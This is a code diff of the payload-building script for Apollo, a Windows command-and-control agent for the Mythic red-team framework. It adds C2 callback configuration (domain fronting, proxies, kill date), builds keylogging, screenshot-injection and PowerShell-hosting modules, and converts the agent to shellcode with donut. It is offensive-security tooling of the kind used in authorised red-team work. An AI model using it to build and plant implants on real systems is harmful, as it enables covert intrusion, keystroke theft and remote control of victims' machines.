@@ -3,7 +3,8 @@ from mythic_payloadtype_container.MythicCommandBase import *
 import os, fnmatch, tempfile, sys, asyncio
 from distutils.dir_util import copy_tree
 import traceback
-
+import donut
+import shutil
 
 class Apollo(PayloadType):
     name = "apollo"
@@ -13,20 +14,23 @@ class Apollo(PayloadType):
     supported_os = [
         SupportedOS.Windows
     ]
-    version = "1.2.1"
+    version = "2.0.0"
     wrapper = False
     wrapped_payloads = ["service_wrapper"]
     note = """
 A fully featured .NET 4.0 compatible training agent. Version: {}
     """.format(version)
     supports_dynamic_loading = True
-    build_parameters = {
-        "version": BuildParameter(name="version", parameter_type=BuildParameterType.ChooseOne, description="Choose a target .NET Framework", choices=["4.0"]),
-        "arch": BuildParameter(name="arch", parameter_type=BuildParameterType.ChooseOne, choices=["x64", "x86", "Any CPU"], default_value="any", description="Target architecture"),
-        "output_type": BuildParameter(name="output_type", parameter_type=BuildParameterType.ChooseOne, choices=[ "WinExe", "Shellcode", "DLL"], default_value="WinExe", description="Output as shellcode, executable, or dynamically loaded library."),
-        "configuration": BuildParameter(name="configuration", parameter_type=BuildParameterType.ChooseOne, choices=["Release"], default_value="Release", description="Build a payload with or without debugging symbols.")
-    }
-    c2_profiles = ["http", "SMBServer"]
+    build_parameters = [
+        BuildParameter(
+            name = "output_type",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=[ "WinExe", "Shellcode"],
+            default_value="WinExe",
+            description="Output as shellcode, executable, or dynamically loaded library.",
+        )
+    ]
+    c2_profiles = ["http", "smb", "tcp"]
     support_browser_scripts = [
         BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
         BrowserScript(script_name="create_table", author="@djhohnstein"),
@@ -43,58 +47,56 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
     async def build(self) -> BuildResponse:
         # this function gets called to create an instance of your payload
         resp = BuildResponse(status=BuildStatus.Error)
+        # debugging
+        # resp.status = BuildStatus.Success
+        # return resp
+        #end debugging
         defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
         special_files_map = {
-            "DefaultProfile.cs": {
+            "Config.cs": {
                 "callback_interval": "",
                 "callback_jitter": "",
                 "callback_port": "",
                 "callback_host": "",
+                "post_uri": "",
+                "proxy_host": "",
+                "proxy_port": "",
+                "proxy_user": "",
+                "proxy_pass": "",
                 "domain_front": "",
+                "killdate": "",
+                "USER_AGENT": "",
+                "pipename": "",
+                "port": "",
                 "encrypted_exchange_check": "",
-                "UUID_HERE": self.uuid,
+                "payload_uuid": self.uuid,
                 "AESPSK": "",
             },
-            "SMBServerProfile.cs": {
-                "pipe_name": "",
-                "UUID_HERE": self.uuid,
-                "AESPSK": "",
-            },
-            "Agent.cs": {
-                "UUID_HERE": self.uuid
-            }
         }
         success_message = f"Apollo {self.uuid} Successfully Built"
+        stdout_err = ""
         defines_profiles_upper = []
         for c2 in self.c2info:
             profile = c2.get_c2profile()
             defines_profiles_upper.append(f"#define {profile['name'].upper()}")
-            if profile["name"] == "http":
-                for key, val in c2.get_parameters_dict().items():
-                    if isinstance(val, dict):
-                        special_files_map["DefaultProfile.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
-                    elif isinstance(val, list):
-                        for item in val:
-                            if not isinstance(item, dict):
-                                raise Exception("Expected a list of dictionaries, but got {}".format(type(item)))
-                            if item["key"] == "Host":
-                                special_files_map["DefaultProfile.cs"]["domain_front"] = item["value"]
-                            elif item["key"] == "User-Agent":
-                                special_files_map["DefaultProfile.cs"]["USER_AGENT"] = item["value"]
-                            else:
-                                special_files_map["DefaultProfile.cs"][item["key"]] = item["value"]
-                    elif isinstance(val, str):
-                        special_files_map["DefaultProfile.cs"][key] = val
-                    else:
-                        special_files_map["DefaultProfile.cs"][key] = json.dumps(val)
-            elif profile["name"] == "SMBServer":
-                for key, val in c2.get_parameters_dict().items():
-                    special_files_map["SMBServerProfile.cs"][key] = val
-            elif profile["name"] == "SMBClient":
-                pass
-            else:
-                raise Exception("Unsupported C2 profile type for Apollo: {}".format(profile["name"]))
-        # create the payload
+            for key, val in c2.get_parameters_dict().items():
+                if isinstance(val, dict):
+                    stdout_err += "Setting {} to {}".format(key, val["enc_key"])
+                    special_files_map["Config.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
+                elif isinstance(val, list):
+                    for item in val:
+                        if not isinstance(item, dict):
+                            raise Exception("Expected a list of dictionaries, but got {}".format(type(item)))
+                        if item["key"] == "Host":
+                            special_files_map["Config.cs"]["domain_front"] = item["value"]
+                        elif item["key"] == "User-Agent":
+                            special_files_map["Config.cs"]["USER_AGENT"] = item["value"]
+                        else:
+                            special_files_map["Config.cs"][item["key"]] = item["value"]
+                elif isinstance(val, str):
+                    special_files_map["Config.cs"][key] = val
+                else:
+                    special_files_map["Config.cs"][key] = json.dumps(val)
         try:
             # make a temp directory for it to live
             agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
@@ -105,10 +107,10 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                 templateFile = open(csFile, "rb").read().decode()
                 templateFile = templateFile.replace("#define C2PROFILE_NAME_UPPER", "\n".join(defines_profiles_upper))
                 templateFile = templateFile.replace("#define COMMAND_NAME_UPPER",  "\n".join(defines_commands_upper) )
-                for profileFile in special_files_map.keys():
-                    if csFile.endswith(profileFile):
-                        for key, val in special_files_map[profileFile].items():
-                            templateFile = templateFile.replace(key, val)
+                for specialFile in special_files_map.keys():
+                    if csFile.endswith(specialFile):
+                        for key, val in special_files_map[specialFile].items():
+                            templateFile = templateFile.replace(key + "_here", val)
                 with open(csFile, "wb") as f:
                     f.write(templateFile.encode())
             outputType = self.get_parameter('output_type').lower()
@@ -119,64 +121,66 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
             elif self.get_parameter('output_type') == "DLL":
                 outputType = "library"
                 file_ext = "dll"
-            command = "nuget restore ; msbuild -p:TargetFrameworkVersion=v{} -p:OutputType=\"{}\" -p:Configuration=\"{}\" -p:Platform=\"{}\"".format(
-                self.get_parameter('version'),
-                outputType,
-                self.get_parameter('configuration'),
-                self.get_parameter('arch'))
+            command = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release -p:Platform=\"Any CPU\""
             proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
             stdout, stderr = await proc.communicate()
-            stdout_err = ""
             if stdout:
                 stdout_err += f'[stdout]\n{stdout.decode()}\n'
             if stderr:
                 stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
-            if self.get_parameter('arch') == "Any CPU":
-                output_path = "{}/Apollo/bin/{}/Apollo.{}".format(agent_build_path.name, self.get_parameter('configuration'), file_ext)
-            else:
-                output_path = "{}/Apollo/bin/{}/{}/Apollo.{}".format(agent_build_path.name, self.get_parameter('arch'), self.get_parameter('configuration'), file_ext)
+            output_path = "{}/Apollo/bin/Release/Apollo.exe".format(agent_build_path.name)
+            
             if os.path.exists(output_path):
                 resp.status = BuildStatus.Success
+                targetExeAsmPath = "/srv/ExecuteAssembly.exe"
+                targetPowerPickPath = "/srv/PowerShellHost.exe"
+                targetScreenshotInjectPath = "/srv/ScreenshotInject.exe"
+                targetKeylogInjectPath = "/srv/KeylogInject.exe"
+                targetExecutePEPath = "/srv/ExecutePE.exe"
+                targetInteropPath = "/srv/ApolloInterop.dll"
+                shutil.move("{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name), targetExeAsmPath)
+                shutil.move("{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name), targetPowerPickPath)
+                shutil.move("{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name), targetScreenshotInjectPath)
+                shutil.move("{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name), targetKeylogInjectPath)
+                shutil.move("{}/ExecutePE/bin/Release/ExecutePE.exe".format(agent_build_path.name), targetExecutePEPath)
+                shutil.move("{}/ApolloInterop/bin/Release/ApolloInterop.dll".format(agent_build_path.name), targetInteropPath)
                 if self.get_parameter('output_type') != "Shellcode":
                     resp.payload = open(output_path, 'rb').read()
                     resp.message = success_message
+                    resp.status = BuildStatus.Success
+                    resp.build_stdout = stdout_err
                 else:
-                    command = "chmod 777 {}/donut; chmod +x {}/donut".format(agent_build_path.name, agent_build_path.name)
-                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE, cwd=agent_build_path.name)
+                    shellcode_path = "{}/loader.bin".format(agent_build_path.name)
+                    donutPath = "/Mythic/agent_code/donut"
+                    command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
+                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
                     stdout, stderr = await proc.communicate()
-                    stdout_err += "Changing donut to be executable..."
-                    stdout_err += stdout.decode()
-                    stdout_err += stderr.decode()
-                    stdout_err += "Done."
-
+                    
+                    command = "{} -f 1 {}".format(donutPath, output_path)
                     # need to go through one more step to turn our exe into shellcode
-                    if self.get_parameter('arch') == "x64" or self.get_parameter('arch') == "Any CPU":
-                        command = "{}/donut -f 1 -a 2 {}".format(agent_build_path.name, output_path)
-                    else:
-                        command = "{}/donut -f 1 -a 1 {}".format(agent_build_path.name, output_path)
                     proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                     stdout, stderr = await proc.communicate()
-                    if stdout:
-                        stdout_err += f'[stdout]\n{stdout.decode()}'
-                    if stderr:
-                        stdout_err += f'[stderr]\n{stderr.decode()}'
-                    if os.path.exists("{}/loader.bin".format(agent_build_path.name)):
-                        resp.payload = open("{}/loader.bin".format(agent_build_path.name), 'rb').read()
-                        resp.status = BuildStatus.Success
-                        resp.build_message = success_message
-                        resp.build_stdout = stdout_err
-                    else:
+                    
+                    stdout_err += f'[stdout]\n{stdout.decode()}\n'
+                    stdout_err += f'[stderr]\n{stderr.decode()}'
+
+                    if (not os.path.exists(shellcode_path)):
+                        resp.message = "Failed to create shellcode"
                         resp.status = BuildStatus.Error
-                        resp.build_message = stdout_err
-                        resp.build_stdout = stdout_err
                         resp.payload = b""
+                        resp.build_stderr = stdout_err
+                    else:
+                        resp.payload = open(shellcode_path, 'rb').read()
+                        resp.message = success_message
+                        resp.status = BuildStatus.Success
+                        resp.build_stdout = stdout_err
             else:
                 # something went wrong, return our errors
                 resp.status = BuildStatus.Error
                 resp.payload = b""
-                resp.build_message = stdout_err
+                resp.build_message = "Unknown error while building payload. Check the stderr for this build."
                 resp.build_stderr = stdout_err
         except Exception as e:
             resp.payload = b""
